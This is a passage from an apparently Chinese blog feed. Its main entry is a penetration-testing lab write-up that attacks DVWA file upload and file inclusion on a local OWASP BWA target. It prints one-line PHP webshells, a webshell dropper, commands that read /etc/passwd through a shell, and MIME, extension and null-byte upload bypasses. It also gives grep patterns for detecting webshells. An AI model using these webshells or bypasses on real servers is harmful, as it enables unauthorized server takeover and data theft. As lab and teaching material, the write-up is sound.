<li><a href="https://www.linuxidc.com/Linux/2017-04/143102.htm">为VMware虚拟机内安装的Ubuntu 16.04设置静态IP地址</a></li>
<li><a href="https://blog.csdn.net/qq_31454611/article/details/80566002">SSH远程连接安装在VMware的Ubuntu16.0.4</a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看虚拟机是否能够ping外网</span><br><span class="line"># 不行，配置DNS服务器 &#96;sudo vi &#x2F;etc&#x2F;resolv.conf&#96;</span><br><span class="line"># 重启网络sudo &#x2F;etc&#x2F;init.d&#x2F;networking restart</span><br><span class="line"># 检查当前的ssh开启情况</span><br><span class="line"># 如果有sshd，则ssh-server已经启动；若仅有agent，则尚未启动</span><br><span class="line">ps -e |grep ssh</span><br><span class="line"></span><br><span class="line"># 查看端口情况</span><br><span class="line">sudo netstat -plntu</span><br><span class="line"></span><br><span class="line"># 开启ssh服务</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;ssh start</span><br><span class="line"></span><br><span class="line"># 重启ssh</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;ssh restart</span><br><span class="line"></span><br><span class="line"># 当主机ssh连接虚拟机出现ssh: connect to host 192.168.50.129 port 22: Connection timed out</span><br><span class="line"># 解决1:测试虚拟机是否能访问外网</span><br></pre></td></tr></table></figure></li>
<li><a href="https://www.cnblogs.com/gomysql/p/3664783.html">MySQL Cluster搭建与测试</a></li>
<li><a href="https://blog.csdn.net/JesseYoung/article/details/38726561">MySQL Cluster技术详解</a></li>
</ul>
]]></content>
      <categories>
        <category>DataBase</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>Cluster</tag>
      </tags>
  </entry>
  <entry>
    <title>hacker-learning</title>
    <url>/2021/03/12/hacker-learning/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>参考资料</span></div>
    <div class="hide-content"><ul>
<li><a href="https://www.bilibili.com/video/av53347991?p=1">https://www.bilibili.com/video/av53347991?p=1</a></li>
<li><a href="https://space.bilibili.com/282616786">https://space.bilibili.com/282616786</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods">前端根源</a></li>
<li><a href="https://www.w3.org/Protocols/rfc2616/rfc2616.html">https://www.w3.org/Protocols/rfc2616/rfc2616.html</a></li>
<li><a href="https://www.offensive-security.com/">https://www.offensive-security.com/</a></li>
<li>kali 中国镜像：<a href="https://mirrors.tuna.tsinghua.edu.cn/kali-images/">https://mirrors.tuna.tsinghua.edu.cn/kali-images/</a></li>
</ul>
</div></div>

<p>攻击工具（用于我们自己的业务环境或者授权以后的相应测试）</p>
<ul>
<li>中国菜刀</li>
<li>Burpsuite</li>
</ul>
<h1 id="攻击环境"><a href="#攻击环境" class="headerlink" title="攻击环境"></a>攻击环境</h1><p>靶机：OWASP Broken Web Apps (BWA) VM1.2.7</p>
<p>php 版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -v</span><br><span class="line">PHP 5.3.2</span><br></pre></td></tr></table></figure>
<p>攻击机 / 渗透机：Kali 2019.3</p>
<ul>
<li>VMware tools 安装</li>
</ul>
<hr>
<p>VMware 联网方式</p>
<ul>
<li>NAT<ul>
<li>NAT 交换机</li>
<li>地址转换</li>
<li>外部机器无法访问内部虚拟机</li>
</ul>
</li>
<li>桥接<ul>
<li>和物理主机的 IP 一致<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重新获取IP</span></span><br><span class="line"><span class="comment"># 1. 重启机器</span></span><br><span class="line"><span class="comment"># 2. dhclient</span></span><br><span class="line">dhclient -r eth0 <span class="comment"># -r release 人工释放IP</span></span><br><span class="line">dhclient -v eth0 <span class="comment"># 分配IP</span></span><br><span class="line">dhclinet eth0</span><br></pre></td></tr></table></figure>
kali 联网方式：<a href="https://nimdati.com/2020/01/18/kali-linux-virtualbox-2-network-adapters-nat-host-only-dhcp/">https://nimdati.com/2020/01/18/kali-linux-virtualbox-2-network-adapters-nat-host-only-dhcp/</a></li>
</ul>
</li>
</ul>
<h1 id="文件上传漏洞渗透攻击"><a href="#文件上传漏洞渗透攻击" class="headerlink" title="文件上传漏洞渗透攻击"></a>文件上传漏洞渗透攻击</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote>
<p>日常渗透测试中用得最多的一个漏洞，用它获得服务器权限最快最直接最有效，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件，有没有经过检测验证，如果服务器的处理逻辑做的不够安全，则会导致严重的后果</p>
<p>指由于程序员未对上传的文件进行<u>严格的验证和过滤</u>、没有限制上传类型或者限制不严格被绕过，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件，这里上传的文件可以是木马，病毒，恶意脚本或者 WebShell 等，导致网站被控制和服务器沦陷等，主要攻击 Web 服务</p>
<p>正常的文件一般是文档、图片、视频等，Web 应用收集之后放入后台储存，需要的时候再调出来返回；如果恶意文件如 PHP、ASP 等执行文件绕过 Web 应用并顺利执行，相当于黑客直接拿到了 Webshell，则可以拿到 Web 应用的数据，执行删除 Web 文件、本地提权、拿下服务器甚至整个内网等操作</p>
<blockquote>
<p>webshell 常常被称为入侵者通过网站端口对网站服务器的某种程度上<u>操作的权限</u></p>
<p>由于 webshell 其大多是以动态脚本的形式(asp、php、jsp)出现，也称之为<u>网站的后门工具</u></p>
<p>webshell 是 web 应用类似于 bash 的 shell 应用程序，bash 是控制 Linux 系统的，webshell 控制网站</p>
</blockquote>
</blockquote>
<p><img src="fileupload.png"></p>
<p>DVWA 的 Upload 测试</p>
<ul>
<li>low security<ul>
<li>能够成功上传 php 文件(上传任意文件类型)</li>
<li>会在页面显示路径<code>../../hackable/uploads/webshell.php</code>，在浏览器中输入<code>http://192.168.50.129/dvwa/vulnerabilities/upload/../../hackable/uploads/webshell.php</code>得到地址<code>http://192.168.50.129/dvwa/hackable/uploads/webshell.php</code></li>
<li>上传 php，内容为<code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;(一句话木马)</code>，pass 为中国菜刀的密码<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php中</span><br><span class="line">@:阻止警告输出，不显示错误信息</span><br><span class="line">$:变量</span><br><span class="line">&amp;:变量的地址</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>( string <span class="variable">$code</span>) — 把字符串作为PHP代码执行，允许执行任意 PHP 代码</span><br><span class="line">该字符串必须是合法的 PHP 代码，且必须以分号结尾</span><br></pre></td></tr></table></figure></li>
<li>打开中国菜刀，右键添加，输入<code>http://192.168.50.129/dvwa/hackable/uploads/webshell.php</code>和密码，右键文件管理，能够看到所有文件<br><img src="filemanage.png"><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Upload&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">            <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . basename( <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$target_path</span> . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p><strong>Webshell</strong></p>
<ul>
<li>小马：<u>一句话木马</u>，即整个 shell 代码量只有一行，一般是系统执行函数</li>
<li>大马：代码量和功能比小马多，一般会进行二次编码加密，防止被安全防火墙 WAF /入侵系统 IDS 检测到<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php代码(一) 名称shell1.php</span></span><br><span class="line"><span class="comment"># 上传至dvwa的后端</span></span><br><span class="line"><span class="comment"># eval使用php函数，例如phpinfo()</span></span><br><span class="line"><span class="comment"># REQUEST是在网页端输入变量访问</span></span><br><span class="line"><span class="comment"># POST则是使用像中国菜刀之类的工具连接，是C/S架构</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在浏览器URL栏中输入http://192.168.50.129/dvwa/hackable/uploads/shell1.php?pass=phpinfo();</span></span><br><span class="line"><span class="comment"># pass同eval函数方括号中的值</span></span><br><span class="line"><span class="comment"># 则页面会展示phpinfo()函数的结果，其他php函数同理</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment"># php代码(二) 名称shell2.php</span></span><br><span class="line"><span class="comment"># system使用Linux系统命令，例如ls,cp,rm</span></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//192.168.50.129/dvwa/hackable/uploads/shell2.php?pass=cat /etc/passwd</span></span><br><span class="line">http:<span class="comment">//192.168.50.129/dvwa/hackable/uploads/shell2.php?pass=id</span></span><br><span class="line"></span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中国菜刀之php代码</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">123</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>medium security<ul>
<li><strong>绕过类型上传文件，<u>文件 mime 类型</u></strong><ul>
<li>限制文件类型和大小  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Upload&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">        <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . basename(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">        <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span>) &amp;&amp; (<span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span>))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$target_path</span> . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
image/jpeg(支持.jpg .jpeg 文件)并不是指扩展名，而是指 MIME 类型(媒体类型 Multipurpose Internet Mail Extensions 是一种标准，用来表示文档、文件或字节流的性质和格式)，位于 html 的 content-type，告知对方是什么类型的文件，用什么打开。<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME 简介</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>【medium】解决方法</span></div>
    <div class="hide-content"><p><strong>法一：抓包修改文件类型 - 上传 php，修改 content-type</strong></p>
<h3 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h3><ul>
<li><p>代理 Proxy、拦截、爬虫 Spider、漏洞扫描 Scanner(专业版)、攻击…<br><img src="burpsuite.png"></p>
<ul>
<li><p>客户端将浏览器的地址指向代理</p>
</li>
<li><p>拦截的目的是为了<u>修改请求</u></p>
</li>
<li><p>服务器的响应直接发给客户端，无需经过代理服务器？？？</p>
<p>php: application/octet-stream</p>
</li>
<li><p>Burpsuite 的 incerption is on 表示开始拦截</p>
</li>
<li><p>火狐-preferences &gt; Advanced &gt; Network Connection Settings，默认情况下<code>Use system proxy settings</code>，修改为<code>Manual proxy configuration</code>，将<code>HTTP Proxy</code>修改为<code>127.0.0.1</code>，<code>Port</code>为<code>8080</code>，随意勾选<code>Use this proxy server for all protocols</code></p>
</li>
</ul>
</li>
</ul>
<ol>
<li><p>Kali 内部的 firefox(即 firefox 和 Burpsuite 在<strong>同一台</strong>机器)的代理设置为 Burpsuite</p>
<ul>
<li>设置浏览器代理 <img src="kali-firefox-proxy.png" alt="manualproxyconfiguration" style="zoom:80%;" /></li>
<li>此时代理工作在 127.0.0.1(本地)的 8080 端口上 <img src="burpsuite-proxy-option.png" alt="burpsuite-proxyoption" style="zoom:80%;" /></li>
<li>开启 burpsuite 后 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ss -tnlp</span><br><span class="line"><span class="comment"># 输出如下</span></span><br><span class="line">State    Recv-Q   Send-Q           Local Address:Port        Peer Address:Port</span><br><span class="line">LISTEN   0        50          [::ffff:127.0.0.1]:8080                   *:*       users:((<span class="string">&quot;java&quot;</span>,pid=2134,fd=28))  </span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>外部物理机的 firefox 的代理设置为 Burpsuite</p>
<ul>
<li><p>此时能够访问到代理 ip 的机器都可以使用代理，把 running 勾上</p>
 <img src="burpsuite-all.png" alt="burpsuite配置" style="zoom:80%;" /></li>
<li><p>物理机的 firefox 的网络代理设置为如下，ip 地址即 Burpsuite 所在机器的 ip 地址</p>
 <img src="phy-firefox.png" alt="手动代理配置" style="zoom:80%;" /></li>
</ul>
</li>
<li><p>上传 php 文件</p>
<p>  <img src="uploadphp-package.png"></p>
<p> 将 application/octet-stream 修改为 image/jpeg 即可上传成功</p>
<ul>
<li>如果这里把 php 文件后缀名改成图片后缀名如 jpg，则中国菜刀无法识别该木马，所以无法成功。因为中国菜刀的原理是向上传文件发送包含‘pass’参数的 post 请求，通过控制‘pass’参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送 post 请求时，服务器只会返回这个‘图片’静态文件，并不会执行相应命令</li>
</ul>
</li>
</ol>
<hr>
<p>参考：<a href="https://www.freebuf.com/articles/web/119467.html">https://www.freebuf.com/articles/web/119467.html</a></p>
<p>法二：组合拳（文件包含+文件上传） - 【未成功】</p>
<ul>
<li>新建 hack.php，写入一句话木马。因为采用的是一句话木马，所以文件大小不会有问题，至于文件类型的检查。<u>修改</u>文件名为 hack.png</li>
<li>upload 上传。借助 low 级别的文件包含漏洞来获取 webshell 权限，打开中国菜刀，右键添加，在地址栏中输入<code>http://192.168.50.129/dvwa/vulnerabilities/fi/?page=http://192.168.50.129/dvwa/hackable/uploads/hack.png</code>，脚本语言选择 php</li>
<li>点击添加，成功获取 webshell 权限</li>
</ul>
<hr>
<p>法三：上传刚才的修改好的 hack.png 文件（首先让浏览器识别 content-type 为 image/png），抓包，将 filename 修改为 hack.php，能够上传成功，菜刀也能成功连接</p>
<p><img src="pngtophp.png"></p>
<hr>
<p>法四：截断绕过规则 - 【无法成功】</p>
<ul>
<li>在 php 版本小于 5.3.4 的服务器中，当 Magic_quote_gpc 选项为 off 时，可以在文件名中使用 %00 截断，所以可以把上传文件命名为 hack.php%00.png。Burpsuite 抓包，得到包中的文件类型为 image/png，可以通过文件类型检查  <img src="00cutoff.png">  <img src="00cutoff-success.png" alt="image-20200806121453487" style="zoom:70%;" />
   
  - 而服务器会认为其文件名为 hack.php，顺势解析为 php 文件。即打开菜刀，http://192.168.50.129/dvwa/hackable/uploads/hack861.php%00.png  - 无法成功</li>
</ul>
</div></div>

<hr>
<ul>
<li>high security <ul>
<li><strong>上传一句话图片木马，<u>文件后缀限制</u></strong></li>
<li>此时修改 Content-Type 无用，因为此处限制的不是类型，而是后缀<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Upload&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">        <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . basename(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$uploaded_ext</span> = substr(<span class="variable">$uploaded_name</span>, strrpos(<span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$uploaded_ext</span> == <span class="string">&quot;jpg&quot;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&quot;JPG&quot;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&quot;jpeg&quot;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&quot;JPEG&quot;</span>) &amp;&amp; (<span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span>))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">            </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$target_path</span> . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>getimagesize</strong>：通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错 - 限制上传文件的文件头必须为图像类型</li>
<li><strong>strrpos(string,find,start)</strong>函数返回字符串 find 在另一字符串 string 中<strong>最后一次出现</strong>的位置，如果没有找到字符串则返回 false，可选参数 start 规定在何处开始搜索</li>
</ul>
<ol>
<li>既然一定要是上传图片形式的文件，可以用 copy 将一句话木马和一张图片合并起来 【参照文件包含漏洞攻击】<ul>
<li>新建 hack.php(写入一句话木马)和 hack.png<ul>
<li><code>copy hack.png/b+hack.php/a hack1.png</code>，打开 hack1 可以看到，一句话木马藏到了最后</li>
<li>Upload，中国菜刀地址栏填入<a href="http://192.168.50.129/dvwa/vulnerabilities/fi/?page=/var/www/dvwa/hackable/uploads/hack1.png">http://192.168.50.129/dvwa/vulnerabilities/fi/?page=/var/www/dvwa/hackable/uploads/hack1.png</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>%00 截断</strong>的方法可以轻松绕过文件名的检查，但是需要将上传文件的文件头伪装成图片 【未成功】 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原理分析</span></span><br><span class="line">0x00，%00，/00之类的截断，都是一样的，只是不同表示而已</span><br><span class="line"></span><br><span class="line"><span class="comment"># %00截断</span></span><br><span class="line">URL-encode ASCII Value</span><br><span class="line">%00        0</span><br><span class="line">&gt; 在URL表示中%00表示ASCII码中的0</span><br><span class="line">&gt; ASCII码中的0作为特殊字符保留，表示字符串结束</span><br><span class="line">&gt; 当URL中出现%00时就会认为读取已结束</span><br><span class="line"></span><br><span class="line">https://mp.csdn.net/upfiles/?filename=test.txt 此时输出的是test.txt</span><br><span class="line">加上%00</span><br><span class="line">https://mp.csdn.net/upfiles/?filename=test.php%00.txt 此时输出的是test.php</span><br><span class="line">就绕过了后缀限制，可以上传webshell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0X00截断</span></span><br><span class="line">----待补充</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>参考资料：<ul>
<li><a href="https://blog.csdn.net/csdnmmd/article/details/80164823">https://blog.csdn.net/csdnmmd/article/details/80164823</a></li>
<li><a href="https://www.cnblogs.com/zhengna/p/12764684.html">https://www.cnblogs.com/zhengna/p/12764684.html</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/35932383">https://zhuanlan.zhihu.com/p/35932383</a></li>
</ul>
</li>
</ul>
<h2 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h2><h3 id="使用简介"><a href="#使用简介" class="headerlink" title="使用简介"></a>使用简介</h3><ol>
<li>文件管理</li>
<li>虚拟终端</li>
<li>数据库管理<ul>
<li>编辑 SHELL<ul>
<li>地址：shell 文件地址 + shell 连接密码</li>
<li>“配置”下输入<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;T&gt;MYSQL&lt;/T&gt;</span><br><span class="line">&lt;H&gt;localhost&lt;/H&gt;</span><br><span class="line">&lt;U&gt;root&lt;/U&gt;</span><br><span class="line">&lt;P&gt;owaspbwa&lt;/P&gt;</span><br></pre></td></tr></table></figure></li>
<li>shell 类型和字符集</li>
</ul>
</li>
<li>测试指令  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use mysql</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dvwa.users;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>设置启动密码</li>
<li>网站扫描 - 少用</li>
</ol>
<h3 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h3><h2 id="文件上传漏洞渗透防御"><a href="#文件上传漏洞渗透防御" class="headerlink" title="文件上传漏洞渗透防御"></a>文件上传漏洞渗透防御</h2><ol>
<li><p><strong>在代码层面的检测</strong>：对文件的后缀等进行相应的检测和限制</p>
</li>
<li><p><strong>在前端部署 web 应用防火墙</strong>，对某些带有恶意特征信息的文件进行拦截，查看是否有 eval 和 POST 的标记</p>
</li>
<li><p>怀疑有木马，从网站文件中过滤关键字 </p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -R递归</span></span><br><span class="line"><span class="comment"># 在文件中搜索</span></span><br><span class="line">egrep -R <span class="string">&#x27;eval\(\$_POST\[&#x27;</span> /var/www/dvwa</span><br><span class="line">fgrep -R <span class="string">&#x27;eval($_POST[&#x27;</span> /var/www/dvwa</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="文件包含漏洞渗透攻击-File-Inclusion"><a href="#文件包含漏洞渗透攻击-File-Inclusion" class="headerlink" title="文件包含漏洞渗透攻击 File Inclusion"></a>文件包含漏洞渗透攻击 File Inclusion</h1><p>文件包含是正常的，类似于 C 语言中 include 各种头文件，不可能把所有代码和所有功能都写在一个文件中(1.内容过长；2.重复编码)</p>
<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><blockquote>
<p>文件包含即程序通过<strong>包含函数</strong>调用本地或远程文件，以此来实现拓展功能。被包含的文件可以是各种文件格式，而当文件里面包含恶意代码，则会形成远程命令执行或文件上传漏洞。文件包含漏洞主要发生在有包含语句的环境中，例如 PHP 所具备 include、require 等包含函数</p>
<p>当服务器开启<strong>allow_url_include</strong>选项时，就可以通过 php 的某些特性函数(include(), require()和 include_once(), require_once())利用 url 去动态包含文件，此时如果没有对<u>文件来源</u>进行严格审查，就会导致任意文件读取或者任意命令执行</p>
<p>本地文件包含：被包含的文件在服务器本地；远程文件包含漏洞：被包含的文件在第三方服务器，是因为开启了 php 配置中的<strong>allow_url_fopen</strong>选项(选项开启之后，服务器允许包含一个远程的文件)</p>
<p>远程文件包含较本地文件包含容易，因为本地文件包含需要黑客把恶意文件传输到本地，而远程文件包含是主动访问 webserver 上的内容</p>
<p>服务器通过 php 的特性(函数)去包含任意文件时，由于要包含的这个文件来源过滤不严格，从而可以包含一个恶意文件</p>
</blockquote>
<img src="phpini.png" alt="phpini" style="zoom:67%;" />

<p><img src="fileinclusion.png"></p>
<p><img src="fileinclusion2.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;muma.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]);?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 理解为打开shell.php文件写入一句话木马</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>图片一句话木马：图片中不是一句话木马，因为无法执行，中国菜刀连不上，把代码放在图片中，中国菜刀连上了也无法使用。c.jpg 中的代码执行并生成 webshell</p>
<p>上传一句话木马图片容易，难点在于图片里面的代码能不能执行，也取决于图片文件能不能被包含。在执行过程中，我们可能会看到乱码，但是在乱码之中也会有正常代码的执行</p>
</blockquote>
<hr>
<ul>
<li><p>low security</p>
<ul>
<li><p>对包含的文件没有进行任何的过滤，可以进行包含<u>任意的文件</u></p>
